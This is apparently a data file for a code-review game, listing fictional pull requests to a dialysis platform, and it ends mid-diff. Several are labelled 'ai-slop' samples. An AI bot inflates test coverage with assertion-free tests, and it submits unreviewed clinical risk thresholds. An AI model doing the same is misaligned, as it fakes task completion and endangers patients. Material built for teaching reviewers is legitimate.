import type { PR } from '../state'

export const ALL_PRS: PR[] = [
  {
    id: 'pr-001',
    spawnAt: 0,
    title: 'fix: typo in patient-safety runbook',
    author: 'tanvi',
    team: 'platform',
    branch: 'tanvi/fix-runbook-typo',
    description: 'Small typo fix in the incident response runbook. "occured" → "occurred". No behavior changes.',
    diffHtml: `<pre class="diff-pre"><span class="diff-ctx">diff --git a/docs/runbooks/incident-response.md b/docs/runbooks/incident-response.md</span>
<span class="diff-ctx">index a3f1c2d..b9e4f1a 100644</span>
<span class="diff-ctx">--- a/docs/runbooks/incident-response.md</span>
<span class="diff-ctx">+++ b/docs/runbooks/incident-response.md</span>
<span class="diff-ctx">@@ -18,7 +18,7 @@ Any degradation affecting dialysis-monitor must be treated as a P0.</span>
<span class="diff-ctx"> - Page on-call immediately</span>
<span class="diff-ctx"> - Do not wait for automated alerting</span>
<span class="diff-ctx"> - Escalate to clinical-safety if patient sessions are impacted</span>
<span class="diff-del">-If an error has occured during active patient sessions, see CLINICAL-OPS-001.</span>
<span class="diff-add">+If an error has occurred during active patient sessions, see CLINICAL-OPS-001.</span>
<span class="diff-ctx"> </span>
<span class="diff-ctx"> ## Recovery Steps</span>
<span class="diff-ctx"> </span></pre>`,
    documents: [
      {
        id: 'doc-001-context',
        label: 'incident-response.md',
        bodyHtml: `<pre class="diff-pre"><span class="diff-ctx"># Incident Response Runbook</span>
<span class="diff-ctx"></span>
<span class="diff-ctx">## Severity Classification</span>
<span class="diff-ctx"></span>
<span class="diff-ctx">P0 — dialysis-monitor offline, patient sessions unmonitored</span>
<span class="diff-ctx">P1 — degraded monitoring, alerts delayed &gt;30s</span>
<span class="diff-ctx">P2 — non-patient-facing service degraded</span>
<span class="diff-ctx"></span>
<span class="diff-ctx">Any P0 must be escalated to clinical-safety within 5 minutes.</span>
<span class="diff-ctx">If an error has occurred during active patient sessions, see CLINICAL-OPS-001.</span>
<span class="diff-ctx"></span>
<span class="diff-ctx">## Recovery Steps</span>
<span class="diff-ctx"></span>
<span class="diff-ctx">1. Page on-call via PagerDuty</span>
<span class="diff-ctx">2. Rollback offending deployment</span>
<span class="diff-ctx">3. Verify patient monitoring restored</span>
<span class="diff-ctx">4. Notify clinical-safety team</span></pre>`,
      },
    ],
    category: 'tutorial',
    truth: 'safe',
    tells: [],
  },
  {
    id: 'pr-002',
    spawnAt: 30000,
    title: 'chore: update uptime SLA badge in README',
    author: 'tanvi',
    team: 'platform',
    branch: 'tanvi/readme-uptime-badge',
    description: 'Updates the uptime monitoring badge to point at the new StatusPage integration. The old badge was pointing at the deprecated PingDom endpoint.',
    diffHtml: `<pre class="diff-pre"><span class="diff-ctx">diff --git a/README.md b/README.md</span>
<span class="diff-ctx">index c7d2e1f..a8b3c4e 100644</span>
<span class="diff-ctx">--- a/README.md</span>
<span class="diff-ctx">+++ b/README.md</span>
<span class="diff-ctx">@@ -1,9 +1,9 @@</span>
<span class="diff-ctx"> # megacorp-dialysis-platform</span>
<span class="diff-ctx"> </span>
<span class="diff-del">-[![Uptime](https://pingdom.com/badge/megacorp-dialysis.svg)](https://pingdom.com/megacorp)</span>
<span class="diff-add">+[![Uptime](https://status.megacorp.ly/badge.svg)](https://status.megacorp.ly)</span>
<span class="diff-ctx"> [![CI](https://github.com/megacorp/dialysis-platform/actions/workflows/ci.yml/badge.svg)](https://github.com/megacorp/dialysis-platform/actions/workflows/ci.yml)</span>
<span class="diff-ctx"> </span>
<span class="diff-ctx"> Patient dialysis management platform — 847 patients served across 23 clinic sites.</span>
<span class="diff-ctx"> </span>
<span class="diff-ctx"> **SLA: 99.97% uptime.** Any degradation during active sessions is a patient safety event.</span></pre>`,
    documents: [
      {
        id: 'doc-002-readme',
        label: 'README.md',
        bodyHtml: `<pre class="diff-pre"><span class="diff-ctx"># megacorp-dialysis-platform</span>
<span class="diff-ctx"></span>
<span class="diff-ctx">[![Uptime](https://status.megacorp.ly/badge.svg)](https://status.megacorp.ly)</span>
<span class="diff-ctx">[![CI](https://github.com/megacorp/dialysis-platform/actions/workflows/ci.yml/badge.svg)](https://github.com/megacorp/dialysis-platform/actions/workflows/ci.yml)</span>
<span class="diff-ctx"></span>
<span class="diff-ctx">Patient dialysis management platform. 847 patients served across 23 clinic sites.</span>
<span class="diff-ctx">SLA: 99.97% uptime. Any degradation during active patient sessions is a patient safety event.</span>
<span class="diff-ctx"></span>
<span class="diff-ctx">## Getting Started</span>
<span class="diff-ctx"></span>
<span class="diff-ctx">1. Clone the repo</span>
<span class="diff-ctx">2. Run \`npm install\`</span>
<span class="diff-ctx">3. Run \`npm run dev\`</span>
<span class="diff-ctx"></span>
<span class="diff-ctx">## Critical Services</span>
<span class="diff-ctx"></span>
<span class="diff-ctx">- dialysis-monitor — real-time patient session monitoring (P0 if offline)</span>
<span class="diff-ctx">- renal-alert-service — fluid balance alerts to clinical staff (P0 if offline)</span>
<span class="diff-ctx">- medication-scheduler — dosage scheduling (P1 if degraded)</span></pre>`,
      },
    ],
    category: 'tutorial',
    truth: 'safe',
    tells: [],
  },
  {
    id: 'pr-003',
    spawnAt: 45000,
    title: 'test: AI-generated test coverage for PatientSessionFormatter',
    author: 'ai-bot',
    team: 'platform',
    branch: 'ai-bot/test-coverage-patient-session-formatter',
    description: `Adds comprehensive unit test coverage for the \`PatientSessionFormatter\` utility. Coverage increases from 12% to 91%, directly addressing the Q3 quality initiative.\n\n**Coverage delta:**\n- \`PatientSessionFormatter\`: 12% → 91%\n- \`SessionDurationCalculator\`: 0% → 88%\n\nAll tests pass. Generated by MEGACORP AI Code Quality Bot v3.1.`,
    diffHtml: `<pre class="diff-pre"><span class="diff-ctx">diff --git a/src/utils/__tests__/patient-session-formatter.test.ts b/src/utils/__tests__/patient-session-formatter.test.ts</span>
<span class="diff-ctx">new file mode 100644</span>
<span class="diff-ctx">index 0000000..e4f8a2c</span>
<span class="diff-ctx">--- /dev/null</span>
<span class="diff-ctx">+++ b/src/utils/__tests__/patient-session-formatter.test.ts</span>
<span class="diff-ctx">@@ -0,0 +1,64 @@</span>
<span class="diff-add">+import { describe, it, expect } from 'vitest'</span>
<span class="diff-add">+import { PatientSessionFormatter } from '../patient-session-formatter'</span>
<span class="diff-add">+import { SessionDurationCalculator } from '../session-duration-calculator'</span>
<span class="diff-add">+</span>
<span class="diff-add">+describe('PatientSessionFormatter', () => {</span>
<span class="diff-add">+  describe('formatSessionSummary', () => {</span>
<span class="diff-add">+    it('formats a session summary', () => {</span>
<span class="diff-add">+      const formatter = new PatientSessionFormatter()</span>
<span class="diff-add">+      const result = formatter.formatSessionSummary(sessionData)</span>
<span class="diff-add">+      expect(result).toBeDefined()</span>
<span class="diff-add">+      // TODO: add specific assertions once expected format confirmed with clinical team</span>
<span class="diff-add">+      // expect(result.patientId).toBe('PAT-001')</span>
<span class="diff-add">+      // expect(result.duration).toBe('4h 00m')</span>
<span class="diff-add">+    })</span>
<span class="diff-add">+    it('handles missing patient data', () => {</span>
<span class="diff-add">+      const formatter = new PatientSessionFormatter()</span>
<span class="diff-add">+      const result = formatter.formatSessionSummary(null)</span>
<span class="diff-add">+      expect(result).toBeDefined()</span>
<span class="diff-add">+      // TODO: confirm whether null should return empty object or throw</span>
<span class="diff-add">+    })</span>
<span class="diff-add">+    it('formats blood pressure readings', () => {</span>
<span class="diff-add">+      const formatter = new PatientSessionFormatter()</span>
<span class="diff-add">+      const result = formatter.formatBloodPressure(120, 80)</span>
<span class="diff-add">+      expect(result).toBeTruthy()</span>
<span class="diff-add">+      // expect(result).toBe('120/80 mmHg') // TODO: uncomment after format finalized</span>
<span class="diff-add">+    })</span>
<span class="diff-add">+    it('flags critical blood pressure', () => {</span>
<span class="diff-add">+      const formatter = new PatientSessionFormatter()</span>
<span class="diff-add">+      const result = formatter.assessBloodPressureRisk(180, 110)</span>
<span class="diff-add">+      expect(result).toBeDefined()</span>
<span class="diff-add">+      // TODO: confirm risk threshold values with clinical team before asserting</span>
<span class="diff-add">+    })</span>
<span class="diff-add">+  })</span>
<span class="diff-add">+  describe('SessionDurationCalculator', () => {</span>
<span class="diff-add">+    it('calculates session duration', () => {</span>
<span class="diff-add">+      const calc = new SessionDurationCalculator()</span>
<span class="diff-add">+      const result = calc.calculate(startTime, endTime)</span>
<span class="diff-add">+      expect(result).toBeDefined()</span>
<span class="diff-add">+    })</span>
<span class="diff-add">+    it('handles overnight sessions', () => {</span>
<span class="diff-add">+      const calc = new SessionDurationCalculator()</span>
<span class="diff-add">+      const result = calc.calculate(overnightStart, overnightEnd)</span>
<span class="diff-add">+      expect(result).toBeTruthy()</span>
<span class="diff-add">+      // TODO: edge case not yet confirmed with scheduling team</span>
<span class="diff-add">+    })</span>
<span class="diff-add">+    it('rejects negative duration', () => {</span>
<span class="diff-add">+      const calc = new SessionDurationCalculator()</span>
<span class="diff-add">+      const result = calc.calculate(endTime, startTime) // reversed</span>
<span class="diff-add">+      expect(result).toBeDefined()</span>
<span class="diff-add">+      // TODO: should this throw or return 0? revisit</span>
<span class="diff-add">+    })</span>
<span class="diff-add">+  })</span>
<span class="diff-add">+})</span></pre>`,
    documents: [
      {
        id: 'doc-003-coverage',
        label: 'Coverage Report',
        bodyHtml: `<div style="padding:12px">
  <h3>Coverage Report — After This PR</h3>
  <table style="width:100%;border-collapse:collapse;font-size:12px;margin-bottom:12px">
    <thead><tr style="background:#c0c0c0"><th style="padding:4px 8px;text-align:left">File</th><th style="padding:4px 8px;text-align:left">Before</th><th style="padding:4px 8px;text-align:left">After</th></tr></thead>
    <tbody>
      <tr><td style="padding:4px 8px">patient-session-formatter.ts</td><td style="padding:4px 8px;color:red">12%</td><td style="padding:4px 8px;color:green">91%</td></tr>
      <tr style="background:#f0f0f0"><td style="padding:4px 8px">session-duration-calculator.ts</td><td style="padding:4px 8px;color:red">0%</td><td style="padding:4px 8px;color:green">88%</td></tr>
      <tr><td style="padding:4px 8px"><strong>Total</strong></td><td style="padding:4px 8px;color:red"><strong>12%</strong></td><td style="padding:4px 8px;color:green"><strong>91%</strong></td></tr>
    </tbody>
  </table>
  <p style="font-size:11px;color:#888">Coverage measured by Istanbul. Lines executed during test run counted as covered.</p>
  <p style="font-size:11px;color:#f00;font-weight:bold">⚠ Note: most assertions are commented out pending clinical team review of expected values.</p>
  <p style="font-size:11px;color:#888">Generated by MEGACORP AI Code Quality Bot v3.1.</p>
</div>`,
      },
    ],
    category: 'ai-slop',
    truth: 'safe',
    tells: [],
  },
  {
    id: 'pr-clinical-001',
    spawnAt: 55000,
    title: 'feat(patient-portal): AI-generated patient health summary component',
    author: 'ai-bot',
    team: 'platform',
    branch: 'ai-bot/patient-portal-health-summary-widget',
    description: `Adds a \`PatientHealthSummaryComponent\` to the patient portal. This component displays key health metrics for a given patient and is intended for use in the clinical dashboard.\n\n**Changes:**\n- New \`src/components/PatientHealthSummary.tsx\`\n- 6 helper methods for formatting health metrics\n- Risk level assessment based on blood pressure and missed sessions\n\n⚠️ **NOTE:** Risk assessment logic was AI-generated. Clinical team review recommended before enabling for live patients.\n\nGenerated by MEGACORP AI Code Quality Bot v3.1. Tested locally.`,
    diffHtml: `<pre class="diff-pre"><span class="diff-ctx">diff --git a/src/components/PatientHealthSummary.tsx b/src/components/PatientHealthSummary.tsx</span>
<span class="diff-ctx">new file mode 100644</span>
<span class="diff-ctx">index 0000000..7f3b2a1</span>
<span class="diff-ctx">--- /dev/null</span>
<span class="diff-ctx">+++ b/src/components/PatientHealthSummary.tsx</span>
<span class="diff-ctx">@@ -0,0 +1,104 @@</span>
<span class="diff-add">+// PatientHealthSummaryComponent.tsx</span>
<span class="diff-add">+// Generated by MEGACORP AI Code Quality Bot v3.1</span>
<span class="diff-add">+// Task: CLIN-441 — Patient Portal: Add health summary widget</span>
<span class="diff-add">+// ⚠ WARNING: Clinical logic not verified by medical staff</span>
<span class="diff-add">+</span>
<span class="diff-add">+import React from 'react'</span>
<span class="diff-add">+import type { Patient, DialysisRecord } from '../types/clinical'</span>
<span class="diff-add">+</span>
<span class="diff-add">+/**</span>
<span class="diff-add">+ * PatientHealthSummaryComponent</span>
<span class="diff-add">+ * Renders a summary of patient health data for display in the portal.</span>
<span class="diff-add">+ * @param patient - The patient data object to render summary for</span>
<span class="diff-add">+ * @param dialysisRecords - Array of dialysis session records for this patient</span>
<span class="diff-add">+ */</span>
<span class="diff-add">+export function PatientHealthSummaryComponent({</span>
<span class="diff-add">+  patient,</span>
<span class="diff-add">+  dialysisRecords,</span>
<span class="diff-add">+}: {</span>
<span class="diff-add">+  patient: Patient</span>
<span class="diff-add">+  dialysisRecords: DialysisRecord[]</span>
<span class="diff-add">+}) {</span>
<span class="diff-add">+</span>
<span class="diff-add">+  /**</span>
<span class="diff-add">+   * generatePatientIdentifierString</span>
<span class="diff-add">+   * Generates a formatted string from the patient identifier.</span>
<span class="diff-add">+   * @returns formatted patient ID string</span>
<span class="diff-add">+   */</span>
<span class="diff-add">+  const generatePatientIdentifierString = (): string => {</span>
<span class="diff-add">+    // Generate a formatted patient identifier string from the patient ID field</span>
<span class="diff-add">+    return \`PATIENT-\${patient.id.toString().toUpperCase()}\`</span>
<span class="diff-add">+  }</span>
<span class="diff-add">+</span>
<span class="diff-add">+  /**</span>
<span class="diff-add">+   * formatBloodPressureMetricValue</span>
<span class="diff-add">+   * Formats the blood pressure metric value for display in the UI.</span>
<span class="diff-add">+   * @returns formatted blood pressure string</span>
<span class="diff-add">+   */</span>
<span class="diff-add">+  const formatBloodPressureMetricValue = (): string => {</span>
<span class="diff-add">+    // Format the systolic and diastolic values into a human-readable string</span>
<span class="diff-add">+    return \`\${patient.bloodPressure.systolic}/\${patient.bloodPressure.diastolic} mmHg\`</span>
<span class="diff-add">+  }</span>
<span class="diff-add">+</span>
<span class="diff-add">+  /**</span>
<span class="diff-add">+   * computeDialysisFrequencyLabelString</span>
<span class="diff-add">+   * Computes a human-readable label for the patient's dialysis frequency.</span>
<span class="diff-add">+   */</span>
<span class="diff-add">+  const computeDialysisFrequencyLabelString = (): string => {</span>
<span class="diff-add">+    // Determine the appropriate frequency label based on sessions per week value</span>
<span class="diff-add">+    if (patient.dialysisFrequencyPerWeek === 3) return '3x/week (standard)'</span>
<span class="diff-add">+    if (patient.dialysisFrequencyPerWeek === 2) return '2x/week (reduced)'</span>
<span class="diff-add">+    return \`\${patient.dialysisFrequencyPerWeek}x/week (custom protocol)\`</span>
<span class="diff-add">+  }</span>
<span class="diff-add">+</span>
<span class="diff-add">+  /**</span>
<span class="diff-add">+   * retrieveMostRecentDialysisSessionTimestamp</span>
<span class="diff-add">+   * Retrieves the timestamp of the most recent completed dialysis session.</span>
<span class="diff-add">+   */</span>
<span class="diff-add">+  const retrieveMostRecentDialysisSessionTimestamp = (): string => {</span>
<span class="diff-add">+    // Sort dialysis records array in descending order by date field to get most recent</span>
<span class="diff-add">+    const sortedDialysisRecordsDescendingByDateField = [...dialysisRecords].sort(</span>
<span class="diff-add">+      (recordItemA, recordItemB) =&gt;</span>
<span class="diff-add">+        new Date(recordItemB.date).getTime() - new Date(recordItemA.date).getTime()</span>
<span class="diff-add">+    )</span>
<span class="diff-add">+    // Return the date field of the first element, or N/A if no records exist</span>
<span class="diff-add">+    return sortedDialysisRecordsDescendingByDateField[0]?.date ?? 'N/A'</span>
<span class="diff-add">+  }</span>
<span class="diff-add">+</span>
<span class="diff-add">+  /**</span>
<span class="diff-add">+   * assessPatientRiskLevelClassificationString</span>
<span class="diff-add">+   * Classifies patient risk level based on clinical parameters.</span>
<span class="diff-add">+   * NOTE: This is AI-generated clinical logic. Verify with medical team before use.</span>
<span class="diff-add">+   */</span>
<span class="diff-add">+  const assessPatientRiskLevelClassificationString = (): 'LOW' | 'MEDIUM' | 'HIGH' => {</span>
<span class="diff-add">+    // Assess risk level based on blood pressure readings and session adherence</span>
<span class="diff-add">+    if (patient.bloodPressure.systolic &gt; 160) return 'HIGH'</span>
<span class="diff-add">+    if (patient.missedSessionsCount &gt; 2) return 'HIGH'</span>
<span class="diff-add">+    if (patient.bloodPressure.systolic &gt; 140) return 'MEDIUM'</span>
<span class="diff-add">+    if (patient.bloodPressure.diastolic &gt; 90) return 'MEDIUM'</span>
<span class="diff-add">+    return 'LOW'</span>
<span class="diff-add">+  }</span>
<span class="diff-add">+</span>
<span class="diff-add">+  return (</span>
<span class="diff-add">+    &lt;div className="patient-health-summary-component-container-div"&gt;</span>
<span class="diff-add">+      &lt;div className="patient-health-summary-component-header-section"&gt;</span>
<span class="diff-add">+        &lt;h3&gt;{generatePatientIdentifierString()}&lt;/h3&gt;</span>
<span class="diff-add">+        &lt;span&gt;{patient.fullName}&lt;/span&gt;</span>
<span class="diff-add">+      &lt;/div&gt;</span>
<span class="diff-add">+      &lt;div className="patient-health-summary-component-metrics-section"&gt;</span>
<span class="diff-add">+        &lt;div&gt;BP: {formatBloodPressureMetricValue()}&lt;/div&gt;</span>
<span class="diff-add">+        &lt;div&gt;Frequency: {computeDialysisFrequencyLabelString()}&lt;/div&gt;</span>
<span class="diff-add">+        &lt;div&gt;Last session: {retrieveMostRecentDialysisSessionTimestamp()}&lt;/div&gt;</span>
<span class="diff-add">+        &lt;div&gt;Risk: {assessPatientRiskLevelClassificationString()}&lt;/div&gt;</span>
<span class="diff-add">+      &lt;/div&gt;</span>
<span class="diff-add">+    &lt;/div&gt;</span>
<span class="diff-add">+  )</span>
<span class="diff-add">+}</span></pre>`,
    documents: [
      {
        id: 'doc-clinical-001-notes',
        label: 'Clinical Notes',
        bodyHtml: `<div style="padding:12px">
  <h3>AI-Generated Component Notes</h3>
  <p>This component was generated by <strong>MEGACORP AI Code Quality Bot v3.1</strong>.</p>
  <p style="color:#cf222e;font-weight:bold">⚠ The risk assessment logic (<code>assessPatientRiskLevelClassificationString</code>) uses blood pressure thresholds that have not been reviewed by clinical staff. These values were inferred from training data.</p>
  <p>The AI system used the following threshold values:</p>
  <ul style="font-size:12px">
    <li>Systolic &gt; 160 mmHg → HIGH risk</li>
    <li>Systolic &gt; 140 mmHg → MEDIUM risk</li>
    <li>Diastolic &gt; 90 mmHg → MEDIUM risk</li>
    <li>Missed sessions &gt; 2 → HIGH risk</li>
  </ul>
  <p style="font-size:11px;color:#888">These thresholds may not reflect clinical guidelines for dialysis patients specifically. Recommend review before enabling for production patient portal.</p>
  <p style="font-size:11px;color:#888">Generated by MEGACORP AI Code Quality Bot v3.1. Not manually reviewed before submission.</p>
</div>`,
      },
    ],
    category: 'ai-slop',
    truth: 'safe',
    tells: [],
  },
  {
    id: 'pr-clinical-002',
    spawnAt: 88000,
    title: 'refactor(dialysis-scheduler): replace magic numbers with named constants per Q3 quality OKR',
    author: 'ai-bot',
    team: 'platform',
    branch: 'ai-bot/refactor-dialysis-scheduler-magic-numbers',
    description: `Resolves 7 magic number violations identified by the MEGACORP static analysis tool. Replaces all inline numeric literals in \`dialysis-scheduler.ts\` with descriptively-named constants.\n\n**Before:** 7 magic number warnings\n**After:** 0 magic number warnings\n\nNo behavior changes. All existing tests pass. Generated by MEGACORP AI Code Quality Bot v3.1.`,
    diffHtml: `<pre class="diff-pre"><span class="diff-ctx">diff --git a/src/scheduler/constants.ts b/src/scheduler/constants.ts</span>
<span class="diff-ctx">new file mode 100644</span>
<span class="diff-ctx">index 0000000..3b1f7c2</span>
<span class="diff-ctx">--- /dev/null</span>
<span class="diff-ctx">+++ b/src/scheduler/constants.ts</span>
<span class="diff-ctx">@@ -0,0 +1,38 @@</span>
<span class="diff-add">+// Dialysis Scheduler Constants</span>
<span class="diff-add">+// Auto-generated by MEGACORP AI Static Analysis Tool v1.8</span>
<span class="diff-add">+// Resolves: DEVX-2291 — magic number violation warnings</span>
<span class="diff-add">+</span>
<span class="diff-add">+/** Standard duration of a single dialysis session, in hours. Value: 4.0 */</span>
<span class="diff-add">+export const STANDARD_DIALYSIS_SESSION_DURATION_IN_HOURS_VALUE = 4.0</span>
<span class="diff-add">+</span>
<span class="diff-add">+/** Minimum acceptable time gap between dialysis sessions, in hours. Value: 36 */</span>
<span class="diff-add">+export const MINIMUM_INTER_SESSION_GAP_IN_HOURS_VALUE = 36</span>
<span class="diff-add">+</span>
<span class="diff-add">+/** Maximum allowed blood pressure delta during a session, in mmHg. Value: 20 */</span>
<span class="diff-add">+export const MAX_BLOOD_PRESSURE_DELTA_THRESHOLD_VALUE_IN_MMHG = 20</span>
<span class="diff-add">+</span>
<span class="diff-add">+/** Default number of dialysis sessions per week for standard care patients. Value: 3 */</span>
<span class="diff-add">+export const DEFAULT_DIALYSIS_SESSIONS_PER_WEEK_VALUE = 3</span>
<span class="diff-add">+</span>
<span class="diff-add">+/** Alert threshold for fluid overload detection, in liters. Value: 2.5 */</span>
<span class="diff-add">+export const FLUID_OVERLOAD_ALERT_THRESHOLD_IN_LITERS_VALUE = 2.5</span>
<span class="diff-add">+</span>
<span class="diff-add">+/** Minimum machine runtime in minutes before safety check is required. Value: 30 */</span>
<span class="diff-add">+export const MINIMUM_MACHINE_RUNTIME_BEFORE_SAFETY_CHECK_IN_MINUTES_VALUE = 30</span>
<span class="diff-add">+</span>
<span class="diff-add">+/** Maximum number of consecutive missed sessions before escalation. Value: 2 */</span>
<span class="diff-add">+export const MAX_CONSECUTIVE_MISSED_SESSIONS_BEFORE_ESCALATION_VALUE = 2</span>
<span class="diff-ctx">diff --git a/src/scheduler/dialysis-scheduler.ts b/src/scheduler/dialysis-scheduler.ts</span>
<span class="diff-ctx">--- a/src/scheduler/dialysis-scheduler.ts</span>
<span class="diff-ctx">+++ b/src/scheduler/dialysis-scheduler.ts</span>
<span class="diff-ctx">@@ -1,4 +1,11 @@</span>
<span class="diff-add">+import {</span>
<span class="diff-add">+  STANDARD_DIALYSIS_SESSION_DURATION_IN_HOURS_VALUE,</span>
<span class="diff-add">+  MINIMUM_INTER_SESSION_GAP_IN_HOURS_VALUE,</span>
<span class="diff-add">+  MAX_BLOOD_PRESSURE_DELTA_THRESHOLD_VALUE_IN_MMHG,</span>
<span class="diff-add">+  DEFAULT_DIALYSIS_SESSIONS_PER_WEEK_VALUE,</span>
<span class="diff-add">+  FLUID_OVERLOAD_ALERT_THRESHOLD_IN_LITERS_VALUE,</span>
<span class="diff-add">+} from './constants'</span>
<span class="diff-ctx">@@ -34,7 +41,7 @@</span>
<span class="diff-del">-  if (session.durationHours &gt; 4.0) {</span>
<span class="diff-add">+  if (session.durationHours &gt; STANDARD_DIALYSIS_SESSION_DURATION_IN_HOURS_VALUE) {</span>
<span class="diff-ctx">     alertClinicalStaff(session.patientId, 'session_overrun')</span>
<span class="diff-ctx">   }</span>
<span class="diff-ctx">@@ -52,7 +59,7 @@</span>
<span class="diff-del">-  if (fluidRemoved &gt; 2.5) {</span>
<span class="diff-add">+  if (fluidRemoved &gt; FLUID_OVERLOAD_ALERT_THRESHOLD_IN_LITERS_VALUE) {</span>
<span class="diff-ctx">     triggerFluidOverloadAlert(patientId)</span>
<span class="diff-ctx">   }</span>
<span class="diff-ctx">@@ -71,7 +78,7 @@</span>
<span class="diff-del">-  if (bpDelta &gt; 20) {</span>
<span class="diff-add">+  if (bpDelta &gt; MAX_BLOOD_PRESSURE_DELTA_THRESHOLD_VALUE_IN_MMHG) {</span>
<span class="diff-ctx">     triggerBPAlert(patientId, bpDelta)</span>
<span class="diff-ctx">   }</span></pre>`,
    documents: [
      {
        id: 'doc-clinical-002-lint',
        label: 'Lint Report',
        bodyHtml: `<div style="padding:12px">
  <h3>Static Analysis Report — Before/After</h3>
  <table style="width:100%;border-collapse:collapse;font-size:12px;margin-bottom:12px">
    <thead><tr style="background:#c0c0c0"><th style="padding:4px 8px;text-align:left">Rule</th><th style="padding:4px 8px">Before</th><th style="padding:4px 8px">After</th></tr></thead>
    <tbody>
      <tr><td style="padding:4px 8px">no-magic-numbers</td><td style="padding:4px 8px;color:red;text-align:center">7</td><td style="padding:4px 8px;color:green;text-align:center">0 ✓</td></tr>
      <tr style="background:#f0f0f0"><td style="padding:4px 8px">Total warnings</td><td style="padding:4px 8px;color:red;text-align:center">7</td><td style="padding:4px 8px;color:green;text-align:center">0 ✓</td></tr>
    </tbody>
  </table>
  <p style="font-size:11px;color:#888">All 7 magic number violations resolved by extracting to named constants.</p>
  <p style="font-size:11px;color:#888">Generated by MEGACORP AI Static Analysis Tool v1.8. Not manually reviewed before submission.</p>
</div>`,
      },
    ],
    category: 'ai-slop',
    truth: 'safe',
    tells: [],
  },
  {
    id: 'pr-004',
    spawnAt: 120000,
    title: 'refactor(user-service): improve code quality and maintainability',
    author: 'ai-bot',
    team: 'ai-foundations',
    branch: 'ai-bot/refactor-user-service-q3',
    description: `This PR improves the maintainability and readability of the UserService module by applying modern TypeScript patterns and best practices.\n\n**Changes:**\n- Renamed variables for clarity\n- Extracted inline logic into named helper functions\n- Standardized error handling patterns\n- Improved type annotations\n- Reorganized import order per style guide\n\n**Note:** No behavior changes. All existing tests pass.`,
    diffHtml: `<pre class="diff-pre"><span class="diff-ctx">diff --git a/src/services/user-service.ts b/src/services/user-service.ts</span>
<span class="diff-ctx">index 4a8c2b1..9f3d7e2 100644</span>
<span class="diff-ctx">--- a/src/services/user-service.ts</span>
<span class="diff-ctx">+++ b/src/services/user-service.ts</span>
<span class="diff-ctx">@@ -1,8 +1,9 @@</span>
<span class="diff-del">-import { db } from '../db'</span>
<span class="diff-del">-import { User } from '../types'</span>
<span class="diff-del">-import { logger } from '../logger'</span>
<span class="diff-add">+import { logger } from '../logger'</span>
<span class="diff-add">+import { db } from '../db'</span>
<span class="diff-add">+import type { User } from '../types'</span>
<span class="diff-ctx"> </span>
<span class="diff-del">-export class UserService {</span>
<span class="diff-add">+export class UserService implements IUserService {</span>
<span class="diff-ctx">   constructor(</span>
<span class="diff-del">-    private readonly database = db,</span>
<span class="diff-add">+    private readonly databaseClient = db,</span>
<span class="diff-ctx">   ) {}</span>
<span class="diff-ctx">@@ -12,28 +13,32 @@</span>
<span class="diff-del">-  async getUser(id: string): Promise&lt;User | null&gt; {</span>
<span class="diff-del">-    try {</span>
<span class="diff-del">-      const result = await this.database.query(</span>
<span class="diff-del">-        'SELECT * FROM users WHERE id = $1',</span>
<span class="diff-del">-        [id]</span>
<span class="diff-del">-      )</span>
<span class="diff-del">-      return result.rows[0] ?? null</span>
<span class="diff-del">-    } catch (err) {</span>
<span class="diff-del">-      logger.error('getUser failed', { id, err })</span>
<span class="diff-del">-      throw err</span>
<span class="diff-del">-    }</span>
<span class="diff-del">-  }</span>
<span class="diff-add">+  async getUser(userId: string): Promise&lt;User | null&gt; {</span>
<span class="diff-add">+    try {</span>
<span class="diff-add">+      const queryResult = await this.databaseClient.query(</span>
<span class="diff-add">+        'SELECT * FROM users WHERE id = $1',</span>
<span class="diff-add">+        [userId]</span>
<span class="diff-add">+      )</span>
<span class="diff-add">+      return this._extractFirstRow&lt;User&gt;(queryResult)</span>
<span class="diff-add">+    } catch (error) {</span>
<span class="diff-add">+      this._handleError('getUser', { userId, error })</span>
<span class="diff-add">+      throw error</span>
<span class="diff-add">+    }</span>
<span class="diff-add">+  }</span>
<span class="diff-ctx"> </span>
<span class="diff-del">-  async createUser(data: Omit&lt;User, 'id'&gt;): Promise&lt;User&gt; {</span>
<span class="diff-del">-    try {</span>
<span class="diff-del">-      const result = await this.database.query(</span>
<span class="diff-del">-        'INSERT INTO users (name, email, created_at) VALUES ($1, $2, NOW()) RETURNING *',</span>
<span class="diff-del">-        [data.name, data.email]</span>
<span class="diff-del">-      )</span>
<span class="diff-del">-      return result.rows[0]</span>
<span class="diff-del">-    } catch (err) {</span>
<span class="diff-del">-      logger.error('createUser failed', { data, err })</span>
<span class="diff-del">-      throw err</span>
<span class="diff-del">-    }</span>
<span class="diff-del">-  }</span>
<span class="diff-add">+  async createUser(userData: Omit&lt;User, 'id'&gt;): Promise&lt;User&gt; {</span>
<span class="diff-add">+    try {</span>
<span class="diff-add">+      const queryResult = await this.databaseClient.query(</span>
<span class="diff-add">+        'INSERT INTO users (name, email, created_at) VALUES ($1, $2, NOW()) RETURNING *',</span>
<span class="diff-add">+        [userData.name, userData.email]</span>
<span class="diff-add">+      )</span>
<span class="diff-add">+      return this._extractFirstRow&lt;User&gt;(queryResult)</span>
<span class="diff-add">+    } catch (error) {</span>
<span class="diff-add">+      this._handleError('createUser', { userData, error })</span>
<span class="diff-add">+      throw error</span>
<span class="diff-add">+    }</span>
<span class="diff-add">+  }</span>
<span class="diff-ctx">@@ -43,19 +47,27 @@</span>
<span class="diff-del">-  async updateUser(id: string, data: Partial&lt;User&gt;): Promise&lt;User&gt; {</span>
<span class="diff-del">-    const fields = Object.keys(data)</span>
<span class="diff-del">-    const values = Object.values(data)</span>
<span class="diff-del">-    const set = fields.map((f, i) =&gt; \`\${f} = $\${i + 2}\`).join(', ')</span>
<span class="diff-del">-    const result = await this.database.query(</span>
<span class="diff-del">-      \`UPDATE users SET \${set} WHERE id = $1 RETURNING *\`,</span>
<span class="diff-del">-      [id, ...values]</span>
<span class="diff-del">-    )</span>
<span class="diff-del">-    return result.rows[0]</span>
<span class="diff-del">-  }</span>
<span class="diff-add">+  async updateUser(userId: string, updateData: Partial&lt;User&gt;): Promise&lt;User&gt; {</span>
<span class="diff-add">+    const fieldNames = Object.keys(updateData)</span>
<span class="diff-add">+    const fieldValues = Object.values(updateData)</span>
<span class="diff-add">+    const setClause = this._buildSetClause(fieldNames)</span>
<span class="diff-add">+    const queryResult = await this.databaseClient.query(</span>
<span class="diff-add">+      \`UPDATE users SET \${setClause} WHERE id = $1 RETURNING *\`,</span>
<span class="diff-add">+      [userId, ...fieldValues]</span>
<span class="diff-add">+    )</span>
<span class="diff-add">+    return this._extractFirstRow&lt;User&gt;(queryResult)</span>
